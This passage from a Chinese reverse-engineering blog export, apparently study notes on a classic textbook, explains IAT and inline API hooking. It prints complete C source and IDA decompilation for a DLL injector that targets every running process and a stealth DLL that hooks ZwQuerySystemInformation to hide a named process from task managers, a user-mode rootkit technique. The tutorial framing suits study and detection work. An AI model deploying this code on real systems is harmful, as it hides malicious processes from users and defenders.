(PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\n\n调试被注入的DLL文件1.首先运行calc.exe，然后打开x32dbg进行附加\n\n2.接着菜单栏选择选项-&gt;选项-&gt;事件，勾选User DLL Load然后保存\n这样，注入DLL文件时，控制权就会转给调试器\n![勾选User DLL Load](.&#x2F;勾选User DLL Load.png)\n3.然后在命令行首先输入命令tasklist | findstr &quot;calc.exe&quot;获取计算器的PID，然后输入命令InjectDll.exe i 计算器PID hookiat.dll将hookiat.dll注入计算器中\n\n4.可以看到，calc.exe进程中发生DLL加载事件时，相关事件就会被通知到调试器，设置好选项后，调试器就会在hookiat.dll的EP处暂停下来\n\n5.接下来取消勾选User DLL Load，然后查找DllMain代码（使用IDA查看），并在其起始位置下断点，然后运行，可以看到调试器在断点处暂停，接下来就可以调试注入的DLL了\n\n\n参考链接https://blog.csdn.net/junbopengpeng/article/details/28142669\n","slug":"IAT Hook","date":"2022-03-25T02:23:09.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"ef0903e74e5233a2be57edee3f37a5dc","title":"inline Hook","content":"原理程序在编译链接后成了二进制代码，我们可以找到需要Hook的函数的地址，然后把这个函数在内存中的二进制代码改为一个JMP指令，令其跳转到执行我们自己构造的函数。\n貌似有点难以理解，来看看详细的原理解释：\n函数一般都存在于DLL中，当DLL中某个函数被调用后，其所在的DLL将会被映射到进程地址空间中。我们可以通过DLL这个模块找到我们需要Hook的函数的地址。然后在内存中改变其地址，使跳转到我们制定的位置。比如现在需要Hook 函数CreateFile，这个函数存在于Kernel32.DLL文件中。首先我们必须要知道这个函数在进程中的地址，然后修改这个函数的首地址为JMP MyProc指令。而MyProc函数可以是API函数，也可以是我们自己构造的函数，如果是我们自己构造的函数，那么我们有两种方法把我们的函数注入进目标进程，那就是通过远程线程注入的两种方法。\nIAT钩取通过操作进程的特定IAT值来实现API钩，而inline hook则将API代码的前5个字节修改为JMP XXXXXXXX指令来钩取API。调用执行被钩取的API时，（修改后的）JMP指令就会被执行，转而控制hooking函数。\n\n\n\n\n\n\n\n\n\n顾名思义，API代码修改就是指直接修改映射到目标进程内存空间的系统DLL的代码。\n进程隐藏进程隐藏的相关内容信息已经得到大量公开，其中用户模式下最常用的就是ntdll.ZwQuerySystemInformation() API钩取技术。\n进程隐藏工作原理为了隐藏某个特定进程，要潜入其他所有进程内存，钩取相关API。也就是说，实现进程隐藏的关键不是进程自身，而是其他进程。\n相关API由于进程是内核对象，所以（用户模式下的程序）只要通过相关API就能检测到它们。用户模式下检测进程的相关API通常分为如下两类：\n1.CreateToolhelp32Snapshot()&amp;EnumProcesses()\n123456789101112HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);                                                           //tlhelp32.h                                                           BOOL WINAPI EnumProcesses(    _Out_writes_bytes_(cb) DWORD* lpidProcess,    _In_ DWORD cb,    _Out_ LPDWORD lpcbNeeded);                                                                                                                  //psapi.h\n\n上面两个API均在其内部调用了ntdll.ZwQuerySystemInformation() API\n2.ZwQuerySystemInformation() \n123456NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);\n\n借助ZwQuerySystemInformation() API可以获取运行中的所有进程信息（结构体），形成一个链表。操作该链表（从链表中删除）即可隐藏相关进程。所以在用户模式下不需要分别钩取CreateToolhelp32Snapshot()与EnumProcesses()，只需要钩取ZwQuerySystemInformation()  API就可隐藏指定进程。注意，我们要钩取的目标进程不是要隐藏的进程，而是其他进程。假如要隐藏的进程为test.exe，如果钩取正在运行中的ProcExp.exe（进程查看器或taskmgr.exe任务管理器）进程的ZwQuerySystemInformation() API，那么ProcExp.exe（或taskmgr.exe）就无法查找到test.exe。\n基于Win10的隐藏notepad.exe练习HideProc.exe负责将stealth.dll文件注入所有运行中的进程。stealth.dll负责钩取（注入stealth.dll文件的）进程的ntdll.ZwQuerySystemInformation() API\n1.首先运行notepad.exe（要隐藏的进程）、procexp.exe（钩取对象1）、taskmgr.exe（钩取对象2）\nHideProc.cpp源码分析HideProc.exe负责向运行中的所有进程注入&#x2F;卸载指定的DLL文件。\nWindows Vista&#x2F;7中使用了会话隔离技术，这可能导致DLL注入失败。出现这个问题，不要使用kernel32.CreateRemoteThread()，而使用ntdll.NtCreateThreadEx()就可以了。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;typedef void (*PFN_SetProcName)(LPCTSTR szProcName);enum &#123;INJECTION_MODE = 0, EJECTION_MODE&#125;;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,            // lookup privilege on local system                              lpszPrivilege,   // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tHANDLE                  hProcess, hThread;\tLPVOID                  pRemoteBuf;\tDWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\tLPTHREAD_START_ROUTINE  pThreadProc;\tif ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        printf(&quot;OpenProcess(%d) failed!!!\\n&quot;, dwPID);\t\treturn FALSE;    &#125;\tpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,                                 MEM_COMMIT, PAGE_READWRITE);\tWriteProcessMemory(hProcess, pRemoteBuf,                        (LPVOID)szDllPath, dwBufSize, NULL);\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;LoadLibraryW&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, pRemoteBuf, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tVirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\tCloseHandle(hThread);\tCloseHandle(hProcess);\treturn TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tBOOL                    bMore = FALSE, bFound = FALSE;\tHANDLE                  hSnapshot, hProcess, hThread;\tMODULEENTRY32           me = &#123; sizeof(me) &#125;;\tLPTHREAD_START_ROUTINE  pThreadProc;\tif( INVALID_HANDLE_VALUE ==         (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )\t\treturn FALSE;\tbMore = Module32First(hSnapshot, &amp;me);\tfor( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )\t&#123;\t\tif( !_tcsicmp(me.szModule, szDllPath) ||             !_tcsicmp(me.szExePath, szDllPath) )\t\t&#123;\t\t\tbFound = TRUE;\t\t\tbreak;\t\t&#125;\t&#125;\tif( !bFound )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tif( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;FreeLibrary&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, me.modBaseAddr, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tCloseHandle(hThread);\tCloseHandle(hProcess);\tCloseHandle(hSnapshot);\treturn TRUE;&#125;BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)&#123;\tDWORD                   dwPID = 0;\tHANDLE                  hSnapShot = INVALID_HANDLE_VALUE;\tPROCESSENTRY32          pe;\t//获取系统快照\tpe.dwSize = sizeof( PROCESSENTRY32 );\thSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );\t//查找进程\tProcess32First(hSnapShot, &amp;pe);\tdo\t&#123;\t\tdwPID = pe.th32ProcessID;\t\t//鉴于系统安全性的考虑\t\t//对于PID小于100的系统进程不执行DLL注入操作\t\tif( dwPID &lt; 100 )\t\t\tcontinue;        if( nMode == INJECTION_MODE )\t\t    InjectDll(dwPID, szDllPath);        else            EjectDll(dwPID, szDllPath);\t&#125;\twhile( Process32Next(hSnapShot, &amp;pe) );\tCloseHandle(hSnapShot);\treturn TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    int                     nMode = INJECTION_MODE;    HMODULE                 hLib = NULL;    PFN_SetProcName         SetProcName = NULL;\tif( argc != 4 )\t&#123;\t\tprintf(&quot;\\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;\\               &quot;&lt;process name&gt; &lt;dll path&gt;\\n\\n&quot;);\t\treturn 1;\t&#125;\t// change privilege\t//只有先提升权限，才能准确获取所有进程的列表\t//内部调用AdjustTokenPrivileges来提权    SetPrivilege(SE_DEBUG_NAME, TRUE);    // load library    hLib = LoadLibrary(argv[3]);    // set process name to hide    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, &quot;SetProcName&quot;);    SetProcName(argv[2]);    // Inject(Eject) Dll to all process    if( !_tcsicmp(argv[1], L&quot;-show&quot;) )\t    nMode = EJECTION_MODE;    InjectAllProcess(nMode, argv[3]);    // free library    FreeLibrary(hLib);\treturn 0;&#125;\n\n首先使用 SetPrivilege提升权限，以便获取系统所有进程列表\n接着调用InjectAllProcess，其内部使用CreateToolhelp32Snapshot获取系统中运行的所有进程列表，然后使用Process32First和Process32Next将获取的进程信息存放到PROCESSENTRY32结构体变量pe中，进而获取进程的PID，然后调用InjectDll来注入DLL\n12345678910111213141516171819202122232425262728293031typedef struct tagPROCESSENTRY32W&#123;    DWORD   dwSize;    DWORD   cntUsage;    DWORD   th32ProcessID;          // this process    ULONG_PTR th32DefaultHeapID;    DWORD   th32ModuleID;           // associated exe    DWORD   cntThreads;    DWORD   th32ParentProcessID;    // this process&#x27;s parent process    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads    DWORD   dwFlags;    WCHAR   szExeFile[MAX_PATH];    // Path&#125; PROCESSENTRY32W;typedef PROCESSENTRY32W *  PPROCESSENTRY32W;typedef PROCESSENTRY32W *  LPPROCESSENTRY32W;HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);BOOL WINAPI Process32FirstW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);BOOL WINAPI Process32NextW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);\n\n\n\nstealth.cpp源码分析实际的API钩取操作由stealth.dll文件复制\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define STATUS_SUCCESS\t\t\t\t\t\t(0x00000000L) typedef LONG NTSTATUS;typedef enum _SYSTEM_INFORMATION_CLASS &#123;    SystemBasicInformation = 0,    SystemPerformanceInformation = 2,    SystemTimeOfDayInformation = 3,    SystemProcessInformation = 5,    SystemProcessorPerformanceInformation = 8,    SystemInterruptInformation = 23,    SystemExceptionInformation = 33,    SystemRegistryQuotaInformation = 37,    SystemLookasideInformation = 45&#125; SYSTEM_INFORMATION_CLASS;typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)                 (SYSTEM_INFORMATION_CLASS SystemInformationClass,                   PVOID SystemInformation,                   ULONG SystemInformationLength,                   PULONG ReturnLength);#define DEF_NTDLL                       (&quot;ntdll.dll&quot;)#define DEF_ZWQUERYSYSTEMINFORMATION    (&quot;ZwQuerySystemInformation&quot;)// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()// global variableBYTE g_pOrgBytes[5] = &#123;0,&#125;;BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;#endif\n\nSetProcName()首先看导出函数SetProcName()\n123456789101112131415161718// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()......//export function#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;\n\n以上代码先创建名为”.SHARE”的共享内存节区，然后创建g_szProcName缓冲区，最后再由导出函数SetProcName()将要隐藏的进程名称保存到g_szProcName中（SetProcName函数在HideProc.exe中被调用执行）\n\n\n\n\n\n\n\n\n\n在共享内存节区创建g_szProcName缓冲区的好处在于，stealth.dll被注入所有进程时，可以彼此共享隐藏进程的名称（随着程序不断改进，甚至也可以做到动态修改隐藏进程）\nDllMain()1234567891011121314151617181920212223242526272829BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;\n\nDllMain函数先比较字符串，若进程名为HookProc.exe，则进行异常处理，不钩取API。发生DLL_PROCESS_ATTACH事件时，调用hook_by_code函数钩取API；发生DLL_PROCESS_DETACH事件时，调用unhook_by_code函数取消API钩取。\nhook_by_code()该函数通过修改代码实现API钩取\n12345678910111213141516171819202122232425262728293031323334BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;\n\nIDA反编译结果：\n12345678910111213141516171819202122int __cdecl sub_10001000(LPCSTR lpModuleName, LPCSTR lpProcName, int a3, int a4)&#123;  HMODULE ModuleHandleA; // eax  FARPROC ProcAddress; // esi  DWORD flOldProtect; // [esp+8h] [ebp-10h] BYREF  _DWORD v8[2]; // [esp+Ch] [ebp-Ch]  v8[0] = &#x27;\\xE9&#x27;;  LOBYTE(v8[1]) = 0;  ModuleHandleA = GetModuleHandleA(lpModuleName);  ProcAddress = GetProcAddress(ModuleHandleA, lpProcName);  if ( *(_BYTE *)ProcAddress == 0xE9 )    return 0;  VirtualProtect(ProcAddress, 5u, 0x40u, &amp;flOldProtect);  *(_DWORD *)a4 = *(_DWORD *)ProcAddress;  *(_BYTE *)(a4 + 4) = *((_BYTE *)ProcAddress + 4);  *(_DWORD *)((char *)v8 + 1) = a3 - (_DWORD)ProcAddress - 5;  *(_DWORD *)ProcAddress = v8[0];  *((_BYTE *)ProcAddress + 4) = (unsigned int)(a3 - (_DWORD)ProcAddress - 5) &gt;&gt; 24;  VirtualProtect(ProcAddress, 5u, flOldProtect, &amp;flOldProtect);  return 1;&#125;\n\nhook_by_code()函数参数介绍如下：\n1234567LPCSTR szDllName：[IN]包含要钩取的API的DLL文件的名称LPCSTR szFuncName：[IN]包含要钩取的API名称PROC pfnNew：[IN]用户提供的钩取函数地址PBYTE pOrgBytes：[OUT]存储原来5个字节的缓冲区，后面脱钩时使用\n\n该函数用于将原来API代码的前5个字节更改为”JMP XXXXXXXX”。\n根据Intel x86（IA-32）指令格式，JMP指令对应的操作码为E9，后面跟4个字节的地址。也就是说，JMP指令的Instruction实际形式为”E9 XXXXXXXX”。需要注意的是，XXXXXXXX地址值不是要跳转的绝对地址值，而是从当前JMP命令到跳转位置的相对距离。通过下列关系式求得XXXXXXXX的地址值：\n1XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）\n\n最后又减去5个字节是因为JMP指令本身长度就是5个字节。例如，当前JMP指令的地址为402000，若想跳转到401000地址处，写成”E9 00401000”是不对的，XXXXXXXX地址值要使用上面的等式换算才行。\nXXXXXXXX&#x3D;401000-402000-5&#x3D;FFFFFFFB\n所以JMP指令的Instruction为”E9 FFFFFFFB”\n\n\n\n\n\n\n\n\n\n除了JMP指令外，还有一种short JMP指令，它是用来进行短距离跳转的指令，对应的IA-32指令为”EB XX”（指令长度为2字节）。\n像上面这样每次使用JMP指令都要计算相对地址，显得不太方便。也可以使用其他指令直接用绝对地址跳转，但是这样的指令长度往往较为复杂。\n例（1）PUSH + RET\n68 00401000 PUSH 00401000\nC3 RETN\n例（2）MOV + JMP\nB8 00401000 MOV EAX,00401000\nFFE0 JMP EAX\nunhook_by_code()该函数用来取消钩取\n12345678910111213141516171819202122232425BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;\n\n脱钩的原理很简单，就是将函数代码开始的前5个字节恢复原值\nNewZwQuerySystemInformation()最后，分析钩取函数NewZwQuerySystemInformation()。在此之前，先看看ntdll.ZwQuerySystemInformation API\n12345678910111213141516171819202122NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION,*PSYSTEM_PROCESS_INFORMATION;\n\n将SystemInformationClass设置为5（SystemProcessInformation）后调用ZwQuerySystemInformation() API，SystemInformation参数中存储的是SYSTEM_PROCESS_INFORMATION结构体单项链表的起始地址。该结构体链表中存储着运行中的所有进程信息。所以隐藏进程前，先要查找与之对应的链表成员，然后断开其与链表的链接。\n下面是NewZwQuerySystemInformation()函数的实现\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;\n\nIDA反编译结果：\n1234567891011121314151617181920212223242526272829303132333435363738394041int __stdcall sub_10001120(int a1, int a2, int a3, int a4)&#123;  int v4; // esi  